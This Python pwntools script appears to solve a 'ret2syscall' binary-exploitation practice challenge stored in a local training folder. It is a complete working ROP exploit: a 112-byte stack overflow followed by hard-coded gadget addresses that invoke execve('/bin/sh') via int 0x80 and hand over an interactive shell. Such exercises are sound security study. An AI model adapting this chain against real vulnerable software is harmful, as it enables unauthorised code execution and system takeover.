from pwn import *

io = process("/home/zrz/Pwn_problem/1/题目/ROP/ret2syscall/ret2syscall")

pop_eax_ret = 0x080bb196

pop_edx_ecx_ebx_ret = 0x0806eb90

int_0x80 = 0x08049421

binsh = 0x080BE408

payload = flat( b'A'*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80 )

io.sendline(payload)

io.interactive()

